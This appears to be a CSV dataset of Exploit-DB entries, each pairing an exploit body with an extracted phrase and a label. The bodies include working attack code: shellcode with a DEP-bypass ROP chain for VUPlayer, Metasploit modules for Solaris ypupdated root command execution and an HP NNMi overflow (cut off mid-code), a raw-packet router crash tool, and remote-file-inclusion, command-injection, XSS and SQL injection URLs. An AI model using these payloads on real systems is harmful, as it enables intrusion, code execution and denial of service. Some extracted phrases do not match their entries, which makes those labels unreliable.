20381,"ManTrap 1.6.1 - Root Directory Inode Disclosure /* source: https://www.securityfocus.com/bid/1909/info  ManTrap is a ""honeypot"" intrusion detection system designed to lure attackers into it for analysis. The honeypot is implemented as a chroot'ed Solaris environment, designed to look and feel real to an attacker who gains access to it.   Chroot (change root) is a unix mechanism that allows an administrator to force a process/process group to run under a subset of the file system, denying access to any other parts of the file system. It is possible for an attacker to guess that they are on a chrooted() ManTrap system by looking at the inode of the root directory (ls -id /). If it is high (usually within the 100000-200000 range), then the root directory is a chrooted() subset of a larger filesystem.   This vulnerability, combined with hidden process disclosure (bugtraq ID 1908) should fairly accurately verify to an attaacker (without root privs) that the host is a ManTrap honeypot, defeating its purpose. */   /*  *  ManTrap detection/testing program by wilson / f8labs - www.f8labs.org  */  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <strings.h> #include <unistd.h> #include <sys/signal.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #include <errno.h> #include <dirent.h>  void check_proc_vs_kill(int listpids) {    struct stat st;   int i, counter;   char buf[520];      printf(""proc-vs-kill() test: \n"");   fflush(0);      if (geteuid() == 0)   {     printf(""  Error: Running as root. NOT performing /proc-vs-kill() test.\n"");     return;   }    if (listpids == 1)   {     printf(""Listing mismatching PIDs:\n"");   }    counter = 0;   for (i = 1; i < 65535; i ++)   {     if ((kill(i, SIGCONT) != 0) && (errno == EPERM)) /* send SIGCONT (which hopefully won't matter) to the process */     {       snprintf(buf, 511, ""/proc/%d"", i);       if (stat(buf, &st) != 0)       {         counter ++;         if (listpids == 1)         {           printf(""%.5d "", i);           if (counter%8 == 0)           {             printf(""\n"");           }          }       }     }   }   if (listpids == 1)   {     printf(""\n"");   }   if (counter == 0)   {     printf(""  Normal: No mismatches found.\n"");   } else   {     printf(""  ManTrap? %d mismatching PIDs found.\n"", counter);   } }  void check_proc_dotdot() {   DIR *procDIR;   struct dirent *procdirent;   int found;      printf(""dotdot test:\n"");   procDIR = opendir(""/proc"");   if (procDIR == NULL)   {     printf(""  Error: Couldn't open /proc while performing dotdot test.\n"");     return;   }   found = 0;   procdirent = readdir(procDIR);   while (procdirent != NULL)   {     if (strcmp(procdirent->d_name, "".."") == 0)     {       found = 1;       break;     }     procdirent = readdir(procDIR);   }   closedir(procDIR);   if (found == 0)   {     printf(""  ManTrap? /proc/.. not found in directory listing!\n"");   } else {     printf(""  Normal: /proc/.. found in directory listing.\n"");   }  }  void check_proc_cwdwalk() {   char savedpwd[2048], newpwd[2048];      printf(""cwdwalk test:\n"");   if (getwd(savedpwd) == NULL)   {     printf(""  Error: Couldn't get working directory while performing cwdwalk test.\n"");     return;   }      if (chdir(""/proc/self"") != 0)   {     printf(""  Error: Couldn't chdir to /proc/self while performing cwdwalk test.\n"");     return;   }   if (chdir(""cwd"") != 0)   {     printf("" Error: Couldn't chdir to /proc/self/cwd while performing cwdwalk test.\n"");     return;   }   if (getwd(newpwd) == NULL)   {     printf(""  ManTrap? getwd() failed after chdir to /proc/self/cwd.\n"");   } else {     printf(""  Normal: getwd() succeeded after chdir to /proc/self/cwd.\n"");   }   chdir(savedpwd);   return; }  void usage(char *myname) {   printf(""Usage: %s <-a|-p|-l|-d|-c|-h>\n"", myname);   printf("" -a performs ALL tests\n"");   printf("" -p performs /proc-vs-kill() test\n"");   printf("" -l performs /proc-vs-kill() test and lists mismatching PIDs\n"");   printf("" -d performs /proc/.. test\n"");   printf("" -c performs /proc/self/cwd test\n"");   printf("" -h shows this help\n""); }  int main(int argc, char *argv[]) {   printf(""ManTrap detection/testing program by wilson@f8labs.org - www.f8labs.org\n"");   if (argc != 2)   {     usage(argv[0]);     exit(1);   }   if (strlen(argv[1]) != 2)   {     usage(argv[0]);     exit(1);   }   switch(argv[1][1])   {     case 'a':       check_proc_vs_kill(0);       check_proc_dotdot();       check_proc_cwdwalk();       break;     case 'p':       check_proc_vs_kill(0);       break;     case 'l':       check_proc_vs_kill(1);       break;     case 'd':       check_proc_dotdot();       break;     case 'c':       check_proc_cwdwalk();       break;     case 'h':     default:       usage(argv[0]);       exit(1);       break;       }   printf(""Finished.\n""); }",looking at the inode of the root directory (ls -id /).,1
9169,"Zortam MP3 Media Studio 9.40 - Multiple Memory Corruption Vulnerabilities #!/usr/bin/perl # # # Title: Zortam MP3 Media Studio 9.40 Multiple Memory Corruption Vulnerabilities # # Product web page: http://www.zortam.com # # Desc: Zortam MP3 Studio version 9.40 suffers from a memory corruption attack from #       two different malicious files. The first method is thru a .mp3 file which #       has its ID3 tags filled with long strings. The second method is a .m3u list #       which is loaded in to the player resulting in memory corruption of the whole #       application including Dr.Watson crashing along with the app. For 1st method, #       you can click the Search Media for MP3's button and select the folder where #       the .mp3 file with the long ID3 tags is located..boom! The 2nd method, load #       .m3u file into the MP3 Player..boom boom! # # Tested on: Microsoft Windows XP Professional SP3 (English) # # # WinDbg: # # [*] overly long id3 tags (.mp3 file): # --------------------------------------------------------------------------- # # (edc.f34): Access violation - code c0000005 (first chance) # First chance exceptions are reported before any exception handling. # This exception may be expected and handled. # eax=00014d6a ebx=00014d6b ecx=000052c8 edx=00029ad4 esi=03a64ffd edi=03aa3864 # eip=005788fe esp=0012cc9c ebp=00029ad4 iopl=0         nv up ei pl nz na po nc # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00050202 # *** ERROR: Symbol file could not be found.  Defaulted to export symbols for [path]\zmmspro.exe -  # zmmspro!ID3_FrameInfo::FieldFlags+0xdce: # 005788fe f3a5            rep movs dword ptr es:[edi],dword ptr [esi] # # --------------------------------------------------------------------------- # # # [*] long playlist (.m3u file): # --------------------------------------------------------------------------- # # (84.b98): Access violation - code c0000005 (first chance) # First chance exceptions are reported before any exception handling. # This exception may be expected and handled. # eax=00000000 ebx=00000111 ecx=00000000 edx=00000000 esi=0012ed5c edi=01e33f54 # eip=005b7ad9 esp=0012ed18 ebp=0012ed2c iopl=0         nv up ei pl nz na pe nc # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00050206 # zmmspro!ID3_FrameInfo::FieldFlags+0x3ffa9: # 005b7ad9 8b01            mov     eax,dword ptr [ecx]  ds:0023:00000000=???????? # 0:000> g # (84.b98): Access violation - code c0000005 (!!! second chance !!!) # eax=00000000 ebx=00000111 ecx=00000000 edx=00000000 esi=0012ed5c edi=01e33f54 # eip=005b7ad9 esp=0012ed18 ebp=0012ed2c iopl=0         nv up ei pl nz na pe nc # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00040206 # zmmspro!ID3_FrameInfo::FieldFlags+0x3ffa9: # 005b7ad9 8b01            mov     eax,dword ptr [ecx]  ds:0023:00000000=???????? # # --------------------------------------------------------------------------- # # # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic # # liquidworm gmail com # # Zero Science Lab - http://www.zeroscience.org # # 16.07.2009 # #      # For first method, use folowing PoC file:			#  #								#  ################################################################  #								#  # - 1. http://zeroscience.org/codes/aimp2_evil.mp3     	#  #								#  # - 2. https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/9167.mp3 (2009-aimp2_evil.mp3) (mirror)	#  #								#  # - 3. http://securityreason.com/download/11/13 (mirror)	#  #								#  ################################################################  #								#  #								#    # For second method, use folowing PoC code:  #   $fle = ""Kung_PoW.m3u"";  $mna = ""A"" x 800000;  print ""\n\n[+] Creating playlist file: $fle ...\r\n"";  sleep 1;  open(m3u, "">./$fle"") || die ""\n\aCannot open $fle: $!"";  print m3u ""$mna"";  close (m3u);  print ""\n[+] Playlist file successfully created!\r\n"";  # milw0rm.com [2009-07-16]",malicious files. The first method is thru a .mp3 file which has its ID3 tags filled with long strings,1
42243,"Microsoft Windows Kernel - 'ATMFD.DLL' Out-of-Bounds Read due to Malformed Name INDEX in the CFF Table Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1213  We have encountered a Windows kernel crash in the ATMFD.DLL OpenType driver while processing a corrupted OTF font file, see below:  --- DRIVER_PAGE_FAULT_BEYOND_END_OF_ALLOCATION (d6) N bytes of memory was allocated and more than N bytes are being referenced. This cannot be protected by try-except. When possible, the guilty driver's name (Unicode string) is printed on the bugcheck screen and saved in KiBugCheckDriver. Arguments: Arg1: fb69b01e, memory referenced Arg2: 00000000, value 0 = read operation, 1 = write operation Arg3: 8f635862, if non-zero, the address which referenced memory. Arg4: 00000000, (reserved)  Debugging Details: ------------------  [...]  FAULTING_IP:  ATMFD+35862 8f635862 803802          cmp     byte ptr [eax],2  MM_INTERNAL_CODE:  0  CPU_COUNT: 4  CPU_MHZ: da3  CPU_VENDOR:  GenuineIntel  CPU_FAMILY: 6  CPU_MODEL: 3e  CPU_STEPPING: 4  CPU_MICROCODE: 6,3e,4,0 (F,M,S,R)  SIG: 19'00000000 (cache) 19'00000000 (init)  DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT  BUGCHECK_STR:  0xD6  PROCESS_NAME:  csrss.exe  CURRENT_IRQL:  2  ANALYSIS_SESSION_HOST:  WIN7-32-VM  ANALYSIS_SESSION_TIME:  03-21-2017 10:49:20.0375  ANALYSIS_VERSION: 10.0.10586.567 x86fre  LAST_CONTROL_TRANSFER:  from 8f636088 to 8f635862  STACK_TEXT:   WARNING: Stack unwind information not available. Following frames may be wrong. 9625f538 8f636088 9625f790 05f70000 9625f790 ATMFD+0x35862 9625f630 8f6355b1 9625f790 05f70000 9625f64c ATMFD+0x36088 9625f734 8f635711 9625f790 05f70000 9625f868 ATMFD+0x355b1 9625f768 8f6051b0 00000000 9625f790 05f70000 ATMFD+0x35711 9625f808 8f607279 00000004 00000001 00000002 ATMFD+0x51b0 9625f888 8f603d14 00000000 00000000 94bb3200 ATMFD+0x7279 9625f96c 8f6e7b8d 00000004 fbad2fc0 fbadaff8 ATMFD+0x3d14 9625f9b4 8f6e7adf 00000001 fbad2fc0 fbadaff8 win32k!PDEVOBJ::LoadFontFile+0x3c 9625f9f4 8f6e74fc ffa6a130 0000002e fbad2fc0 win32k!vLoadFontFileView+0x291 9625fa80 8f6d6403 9625fb58 0000002e 00000001 win32k!PUBLIC_PFTOBJ::bLoadFonts+0x209 9625facc 8f6d73d8 9625fb58 0000002e 00000001 win32k!GreAddFontResourceWInternal+0xfb 9625fc14 8164ddb6 000d9b78 0000002e 00000001 win32k!NtGdiAddFontResourceW+0x142 9625fc14 77ad6c74 000d9b78 0000002e 00000001 nt!KiSystemServicePostCall ---  The bugcheck is caused by an attempt to read memory from an unmapped address. The specific expression being dereferenced by ATMFD.DLL is ""base address of the Name INDEX data + NAME.offset[x] - 1"", however no bounds checking is performed over the value of NAME.offset[x] before using it for pointer arithmetic. To our current knowledge, this condition can only lead to an out-of-bounds read, thus limiting the impact of the bug to remote denial of service, or potentially local kernel memory disclosure. However, we have not fully confirmed that the severity of the bug is not in fact more significant due to some further ATMFD logic we are not aware of.  Interestingly, the crash is almost identical to the one reported in  Issue #386  (MSRC-30296) nearly two years ago, which was supposedly fixed as CVE-2015-2461 in the MS15-080 bulletin. The fact that the same bugcheck still reproduces can potentially mean that the patch was insufficient.  Only a single bitflip applied to a valid font file is sufficient to create an offending testcase (excluding SFNT table checksums). In our case, the byte at offset 0x375 in the original sample must be changed from 0x01 to 0x41. This corresponds to offset 0x71 of the ""CFF "" table. The PoC font can be found attached to this tracker entry.  The issue reproduces on Windows 7 (other platforms untested). It is easiest to reproduce with Special Pools enabled for ATMFD.DLL, leading to an immediate crash when the bug is triggered. The bugcheck occurs upon opening the font in any default utility such as the Windows Font Viewer -- no special tools are required.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42243.zip",processing a corrupted OTF font file,1
30437,Global Centre Aplomb Poll 1.1 - 'vote.php?Madoa' Remote File Inclusion source: https://www.securityfocus.com/bid/25138/info   Aplomb Poll is prone to multiple remote file-include vulnerabilities because the application fails to properly sanitize user-supplied input.   An attacker can exploit these issues to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.   Aplomb Poll 1.1 is vulnerable; other versions may also be affected.   http://www.example.com/vote.php?Madoa=http://sheel.txt?,include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process,1
13756,"VUPlayer 2.49 - '.m3u' File Universal Buffer Overflow (DEP Bypass) (1) #!/usr/bin/env python # # VUPlayer <=2.49 .M3u Universal buffer overflow exploit w/ DEP bypass # Author: mr_me # Download: http://vuplayer.com/ # Tested on Wind0ws XP SP3 /noexecute=alwayson # Greetz: Corelan Security Team # http://www.corelan.be:8800/index.php/security/corelan-team-members/ #  # DEP AlwaysOn bypass version # Thanks to Sud0 & Lincoln, for the motivation to learn this :-) #   # http://www.metasploit.com # EXITFUNC=process, CMD=calc.exe sc = (""\x89\xe1\xd9\xee\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"" ""\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"" ""\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"" ""\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"" ""\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"" ""\x48\x47\x34\x43\x30\x45\x50\x45\x50\x4c\x4b\x51\x55\x47"" ""\x4c\x4c\x4b\x43\x4c\x45\x55\x42\x58\x45\x51\x4a\x4f\x4c"" ""\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"" ""\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x4a\x4e\x46"" ""\x51\x49\x50\x4c\x59\x4e\x4c\x4d\x54\x49\x50\x42\x54\x45"" ""\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4c"" ""\x34\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4b\x55\x4c"" ""\x4b\x51\x4f\x47\x54\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44"" ""\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c"" ""\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4c\x49\x51\x4c\x46"" ""\x44\x44\x44\x48\x43\x51\x4f\x50\x31\x4a\x56\x45\x30\x50"" ""\x56\x42\x44\x4c\x4b\x51\x56\x50\x30\x4c\x4b\x51\x50\x44"" ""\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x45"" ""\x58\x4b\x39\x4a\x58\x4d\x53\x49\x50\x42\x4a\x50\x50\x43"" ""\x58\x4a\x50\x4d\x5a\x44\x44\x51\x4f\x45\x38\x4a\x38\x4b"" ""\x4e\x4c\x4a\x44\x4e\x50\x57\x4b\x4f\x4d\x37\x42\x43\x43"" ""\x51\x42\x4c\x42\x43\x43\x30\x41\x41"");  crash = ""HTTP://"" + ""\x41"" * 1005  rop = ""\xd3\x72\x60\x10"" # POPAD # JE SHORT BASSMIDI.10607337		: 0x106072D3  rop += ""\x2f\x10\x60\x10"" # POP EDI # MOV EAX,ESI # POP ESI # RETN	: 0x1060102F rop += ""\x13\x22\x80\x7c"" # @ of WriteProcessMemory()				: 0x7C802213 rop += ""\xcf\x22\x80\x7c"" # Address to patched in kernel32			: 0x7C8022CF rop += ""\x44\x44\x44\x44"" # JUNK									: 0x44444444 rop += ""\xff\xff\xff\xff"" # start @ -1 for shellcode size			: 0xffffffff rop += ""\x15\x10\x10\x10"" # This @ from .data segment of app dll	: 0x10101015  rop += ""\x44\x44\x44\x44"" # JUNK									: 0x44444444 rop += ""\x44\x44\x44\x44"" # JUNK									: 0x44444444 rop += ""\x44\x44\x44\x44"" # JUNK									: 0x44444444 rop += ""\x79\x21\x60\x10"" # POP EDI # POP ESI # RETN				: 0x10602179 rop += ""\x88\x71\x60\x10"" # CALL EAX								: 0x10607188 rop += ""\xff\xff\xff\xff"" # -hProcess argv[1]						: 0xffffffff  # Get the length of shellcode - @ from kernel32 rop += ""\x6f\x10\x81\x7c"" * 305 # INC EBX # RETN					: 0x7C81106F  # push all args on the stack for WPM() - @ from shell32.dll rop += ""\xf9\x18\xa1\x7c"" # PUSHAD # RETN							: 0x7CA118F9  buffer = crash + rop + sc  print ""[+] Building .m3u file"" file = open('cst-vuplayer.m3u','w'); file.write(buffer); file.close(); print ""[+] Done""",a specially crafted .m3u file,1
22447,"HP Instant TopTools 5.0 - Remote Denial of Service source: https://www.securityfocus.com/bid/7246/info  It has been reported that Instant TopTools does not properly handle some types of requests. Because of this, a remote user could potentially deny service to a host using the vulnerable software.   http://www.example.com/cgi-bin/hpnst.exe?c=p+i=hpnst.exe",the vulnerable software,1
37360,"GeniXCMS 0.0.3 - Cross-Site Scripting # Exploit Title:  Persistent XSS # Google Dork: intitle: Persistent XSS # Date: 2015-06-21 # Exploit Author:  John Page ( hyp3rlinx ) # Website: hyp3rlinx.altervista.org # Vendor Homepage: genixcms.org # Software Link: genixcms.org # Version: 0.0.3 # Tested on: windows 7 # Category: webapps   Vendor: ============================================= genixcms.org    Product: ===================================================== GeniXCMS v0.0.3 is a PHP based content management system    Advisory Information: =================================================== Multiple persistent & reflected XSS vulnerabilities    Vulnerability Details: ========================================================= GeniXCMS v0.0.3 is vulnerable to persistent and reflected XSS    XSS Exploit code(s): ====================  Persistent XSS: ----------------------- http://localhost/GeniXCMS-master/GeniXCMS-master/gxadmin/index.php?page=posts&act=add&token=  1-content input field content injected XSS will execute after posting is published  2-title input field title injected XSS will execute immediate.   Relected XSS: --------------------- http://localhost/GeniXCMS-master/GeniXCMS-master/gxadmin/index.php?page=posts&q=1'<script>alert('XSS By Hyp3rlinx')</script>    Disclosure Timeline: ========================================================= Vendor Notification: NA June 21, 2015 : Public Disclosure    Severity Level: ========================================================= Med    Description: =========================================================  Request Method(s):         [+] GET & POST    Vulnerable Product:        [+] GeniXCMS 0.0.3    Vulnerable Parameter(s):   [+] q, content & title                          Affected Area(s):          [+] index.php                                                          ===============================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.   (hyp3rlinx)",specially crafted environment variables,1
19761,"Sambar Server 4.2 Beta 7 - Batch CGI source: https://www.securityfocus.com/bid/1002/info  The Sambar Web/FTP/Proxy Server for Windows NT and 2000 supports DOS-style batch programs as CGI scripts. A remote attacker can use any batch file used by the server in the 'cgi-bin' directory to run any valid command-line program with administrator privileges. This allows the attacker to read, modify, create, or delete any file or directory on the system, including user accounts, etc. Even if the user hasn't enabled or created any batch files, the software ships with two by default: 'hello.bat' and 'echo.bat'.  http://target/cgi-bin/hello.bat?&dir+c:or http://target/cgi-bin/echo.bat?&dir+c:\",use any batch file used by the server in the 'cgi-bin' directory to run any valid command-line program with administrator privileges,1
22415,"3Com SuperStack II RAS 1500 - IP Header Denial of Service // source: https://www.securityfocus.com/bid/7175/info   vulnerability has been reported in the 3Com SuperStack II RAS 1500 router. The problem occurs when processing network packets containing malicious IP headers. When received, the packet may cause the router to crash.  /*  * 3com superstack II RAS 1500 remote Denial of Service  *  * Piotr Chytla <pch@isec.pl>  *  * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*  * IT IS PROVIDED ""AS IS"" AND WITHOUT ANY WARRANTY  *  * (c) 2003 Copyright by iSEC Security Research  */  #include <stdio.h> #include <sys/types.h> #include <sys/socket.h> #include <libnet.h> #define OPT_LEN 4 void usage() {   printf(""Args: \n"");   printf(""-s [source address]\n"");   printf(""-d [destination address]\n""); }  int main(int argc,char *argv[]) {  char a;  int sock,r;  u_long src;  u_long dst;  char pktbuf[IP_MAXPACKET];  char payload[]=""ABCDEFGHIJKLMNOPRST"";  u_char options[4];  struct ipoption ipopt;  bzero(options,OPT_LEN);  while((a=getopt(argc,argv,""d:s:h?""))!=EOF)  {      switch(a) {          case 'h' : { usage(); exit(1); }          case 's' : { src=libnet_name_resolve(optarg,0); break;}          case 'd' : { dst=libnet_name_resolve(optarg,0); break;}         }  }  sock = libnet_open_raw_sock(IPPROTO_RAW);  if (sock<0)  {  perror(""socket"");  exit(1);  }   libnet_build_ip(strlen(payload),0,0x1337,0,255,0xaa,src,dst,payload,strlen(payload),pktbuf);   memcpy(ipopt.ipopt_list, options, OPT_LEN);   *(ipopt.ipopt_list)     = 0xe4;   *(ipopt.ipopt_list+1)   = 0;   *(ipopt.ipopt_list+1)   = 0;   *(ipopt.ipopt_list+1)   = 0;   r=libnet_insert_ipo(&ipopt,OPT_LEN,pktbuf);   if (r <0)    {         libnet_close_raw_sock(sock);         printf(""Error ip options insertion failed\n"");         exit(1);    }   r=libnet_write_ip(sock,pktbuf,LIBNET_IP_H+OPT_LEN+strlen(payload));   if (r<0)   {    libnet_close_raw_sock(sock);    printf(""Error write_ip \n"");    exit(1);   }  libnet_close_raw_sock(sock);  return 0; }",malicious IP headers,1
32800,"Poppler 0.10.3 - Denial of Service source: https://www.securityfocus.com/bid/33749/info  Poppler is prone to multiple denial-of-service vulnerabilities when handling malformed PDF files.  Successfully exploiting this issue allows remote attackers to crash applications that use the vulnerable library, denying service to legitimate users.  These issues affect versions prior to Poppler 0.10.4.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32800.pdf",malformed PDF files,1
5366,"Sun Solaris 10 - rpc.ypupdated Remote Code Execution (Metasploit)                       ____      ____     __    __                      /    \    /    \   |  |  |  |         ----====####/  /\__\##/  /\  \##|  |##|  |####====----                    |  |      |  |__|  | |  |  |  |                    |  |  ___ |   __   | |  |  |  |   ------======######\  \/  /#|  |##|  |#|  |##|  |######======------                      \____/  |__|  |__|  \______/                                                                           Computer Academic Underground                         http://www.caughq.org                             Exploit Code  ===============/======================================================== Exploit ID:     CAU-EX-2008-0001 Release Date:   2008.04.04 Title:          ypupdated_exec.rb Description:    Solaris ypupdated Command Execution Tested:         Solaris x86/sparc 10, sparc 9, 8, 2.7 Attributes:     Remote, NULL Auth, Elevated Privileges, Metasploit Exploit URL:    http://www.caughq.org/exploits/CAU-EX-2008-0001.txt Author/Email:   I)ruid <druid (@) caughq.org> ===============/========================================================  Description ===========  This exploit targets a weakness in the way the ypupdated RPC application uses the command shell when handling a MAP UPDATE request.  Extra commands may be launched through this command shell, which runs as root on the remote host, by passing commands in the format '|<command>'.   Credits =======  Josh D. <mcpheea@cadvision.com> from Avalon Security Research is credited with originally discovering this vulnerability.  This Metasploit exploit module was modeled after kcope's exploit released to Milw0rm on 2008.03.20.   References ==========  http://osvdb.org/displayvuln.php?osvdb_id=11517 http://cve.mitre.org/cgi-bin/cvename.cgi?name=1999-0209 https://www.securityfocus.com/bid/1749/info http://www.milw0rm.com/exploits/5282   Metasploit ==========  require 'msf/core'  module Msf  class Exploits::Solaris::Sunrpc::YPUpdateDExec < Msf::Exploit::Remote  	include Exploit::Remote::SunRPC  	def initialize(info = {}) 		super(update_info(info,	 			'Name'           => 'Solaris ypupdated Command Execution', 			'Description'    => %q{ 				This exploit targets a weakness in the way the ypupdated RPC 				application uses the command shell when handling a MAP UPDATE 				request.  Extra commands may be launched through this command 				shell, which runs as root on the remote host, by passing 				commands in the format '|<command>'.  				Vulnerable systems include Solaris 2.7, 8, 9, and 10, when 				ypupdated is started with the '-i' command-line option. 			}, 			'Author'         => [ 'I)ruid <druid@caughq.org>' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 4498 $', 			'References'     => 				[ 					['BID', '1749'], 					['CVE', '1999-0209'], 					['OSVDB', '11517'], 				], 			'Privileged'     => true, 			'Platform'       => ['unix', 'solaris'], 			'Arch'           => ARCH_CMD, 			'Payload'        => 				{ 					'Space'    => 1024, 					'DisableNops' => true, 				}, 			'Targets'        => [ ['Automatic', { }], ], 			'DefaultTarget' => 0 		))  		register_options( 			[ 				OptString.new('HOSTNAME', [false, 'Remote hostname', 'localhost']), 				OptInt.new('GID', [false, 'GID to emulate', 0]), 				OptInt.new('UID', [false, 'UID to emulate', 0]) 			], self.class 		) 	end  	def exploit 		hostname  = datastore['HOSTNAME'] 		program   = 100028 		progver   = 1 		procedure = 1  		print_status 'Sending PortMap request for ypupdated program' 		pport = sunrpc_create('udp', program, progver)  		print_status ""Sending MAP UPDATE request with command '#{payload.encoded}'"" 		print_status 'Waiting for response...' 		sunrpc_authunix(hostname, datastore['UID'], datastore['GID'], []) 		command = '|' + payload.encoded 		msg = XDR.encode(command, 2, 0x78000000, 2, 0x78000000) 		sunrpc_call(procedure, msg)  		sunrpc_destroy  		print_good 'No Errors, appears to have succeeded!' 	rescue ::Rex::Proto::SunRPC::RPCTimeout 		print_status 'Warning: ' + $! 		print_status 'Exploit may or may not have succeeded.' 	end  end end	  # milw0rm.com [2008-04-04]",passing commands in the format '|<command,1
46835,XOOPS 2.5.9 - SQL Injection [+] Sql Injection on XOOPS CMS v.2.5.9  [+] Date: 12/05/2019  [+] Risk: High  [+] CWE Number : CWE-89  [+] Author: Felipe Andrian Peixoto  [+] Vendor Homepage: https://xoops.org/  [+] Contact: felipe_andrian@hotmail.com  [+] Tested on: Windows 7 and Gnu/Linux  [+] Dork: inurl:gerar_pdf.php inurl:modules // use your brain ;)  [+] Exploit :           http://host/patch/modules/patch/gerar_pdf.php?cid= [SQL Injection]      [+] EOF,a malicious web site,1
34866,"HP Network Node Manager I - PMD Buffer Overflow (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::Udp    def initialize(info = {})     super(update_info(info,       'Name'           => 'HP Network Node Manager I PMD Buffer Overflow',       'Description'    => %q{         This module exploits a stack buffer overflow in HP Network Node Manager I (NNMi). The         vulnerability exists in the pmd service, due to the insecure usage of functions like         strcpy and strcat while handling stack_option packets with user controlled data. In         order to bypass ASLR this module uses a proto_tbl packet to leak an libov pointer from         the stack and finally build the rop chain to avoid NX.       },       'Author'         =>         [           'd(-_-)b',     # Vulnerability discovery           'juan vazquez' # Metasploit module         ],       'References'     =>         [           ['CVE', '2014-2624'],           ['ZDI', '14-305']         ],       'Payload'        =>         {           'BadChars'    => ""\x00"",           'Space'       => 3000,           'DisableNops' => true,           'Compat'      =>             {               'PayloadType' => 'cmd cmd_bash',               'RequiredCmd' => 'generic python perl openssl bash-tcp gawk'             }         },       'Arch'           => ARCH_CMD,       'Platform'       => 'unix',       'Targets'        =>         [           ['Automatic', {}],           ['HP NNMi 9.10 / CentOS 5',             {               # ptr to .rodata with format specifier               #.rodata:0003BE86 aS_1            db '%s',0               'ov_offset'      => 0x3BE86,               :rop             => :rop_hp_nnmi_9_10             }           ],           ['HP NNMi 9.20 / CentOS 6',             {               # ptr to .rodata with format specifier               #.rodata:0003C2D6 aS_1            db '%s',0               'ov_offset'      => 0x3c2d8,               :rop             => :rop_hp_nnmi_9_20             }           ]         ],       'Privileged'     => false, # true for HP NNMi 9.10, false for HP NNMi 9.20       'DisclosureDate' => 'Sep 09 2014',       'DefaultTarget'  => 0       ))      register_options([ Opt::RPORT(7426) ], self.class)   end    def check     header = [       0x2a5,  # pmdmgr_init pkt       0x3cc,  # signature       0xa0c,  # signature       0xca8   # signature     ].pack(""V"")      data = ""\x00"" * (0xfa4 - header.length)      pkt = header + data      connect_udp     udp_sock.put(pkt)     res = udp_sock.timed_read(8, 1)     if res.blank?       # To mitigate MacOSX udp sockets behavior       # see https://dev.metasploit.com/redmine/issues/7480       udp_sock.put(pkt)       res = udp_sock.timed_read(8)     end     disconnect_udp      if res.blank?       return Exploit::CheckCode::Unknown     elsif res.length == 8 && res.unpack(""V"").first == 0x2a5       return Exploit::CheckCode::Detected     else       return Exploit::CheckCode::Unknown     end   end    def exploit     connect_udp     # info leak with a ""proto_tbl"" packet     print_status(""Sending a 'proto_tbl' request..."")     udp_sock.put(proto_tbl_pkt)      res = udp_sock.timed_read(13964, 1)     if res.blank?       # To mitigate MacOSX udp sockets behavior       # see https://dev.metasploit.com/redmine/issues/7480       udp_sock.put(proto_tbl_pkt)       res = udp_sock.timed_read(13964)     end      if res.blank?       fail_with(Failure::Unknown, ""Unable to get a 'proto_tbl' response..."")     end      if target.name == 'Automatic'       print_status(""Fingerprinting target..."")       my_target = auto_target(res)       fail_with(Failure::NoTarget, ""Unable to autodetect target..."") if my_target.nil?     else       my_target = target       fail_with(Failure::Unknown, ""Unable to leak libov base address..."") unless find_ov_base(my_target, res)     end      print_good(""Exploiting #{my_target.name} with libov base address at 0x#{@ov_base.to_s(16)}..."")      # exploit with a ""stack_option_pkt"" packet     udp_sock.put(stack_option_pkt(my_target, @ov_base))      disconnect_udp   end    def rop_hp_nnmi_9_10(ov_base)     rop = rand_text_alpha(775)     rop << [0x808d7c1].pack(""V"")          # pop ebx ; pop ebp ; ret     rop << [ov_base + 0x481A8].pack(""V"")  # ebx: libov .got     rop << [0x8096540].pack(""V"")          # ptr to .data where user controlled string will be stored:                                           # ""PMD Stack option specified, but stack not available (user_controlled)""     rop << [0x808d7c2].pack(""V"")          # pop ebp # ret     rop << [0x08096540 + 4732].pack(""V"")  # ebp: ptr to our controlled data in .data (+0x1028 to compensate)     rop << [ov_base +  0x1D692].pack(""V"") # ptr to 'call _system' sequence:                                           #.text:0001D692  lea     eax, [ebp+dest]                                           #.text:0001D698  push    eax             ; command                                           #.text:0001D699  call    _system     rop   end    def rop_hp_nnmi_9_20(ov_base)     rop = rand_text_alpha(775)     rop << 